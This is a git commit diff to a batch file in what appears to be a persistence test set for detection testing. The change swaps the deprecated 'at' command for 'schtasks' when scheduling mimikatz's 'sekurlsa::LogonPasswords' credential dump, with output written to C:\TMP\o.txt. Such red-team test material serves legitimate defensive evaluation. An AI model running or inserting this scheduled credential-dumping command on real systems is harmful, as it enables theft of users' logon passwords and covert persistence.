1c0aff4790e43129c95a76c56e1c806efb8aa7ea
NaimishP <36006376+NaimishP@users.noreply.github.com>
2020-03-25 15:11:20 -0500

    Update at-jobs.bat
    Updated at with schtasks (at has been deprecated)

--- test-sets/persistence/at-jobs.bat
+++ test-sets/persistence/at-jobs.bat
@@ -2,7 +2,7 @@
 
 ECHO ===========================================================================
 ECHO At Job Creation
-ECHO Registering mimikatz in At job
+ECHO Registering mimikatz in schtasks job
 ping -n 5 127.0.0.1 > NUL
 
-at 13:00 "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"
+schtasks /create /tn "Registering mimikatz" /tr "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt" /sc once /st 13:00
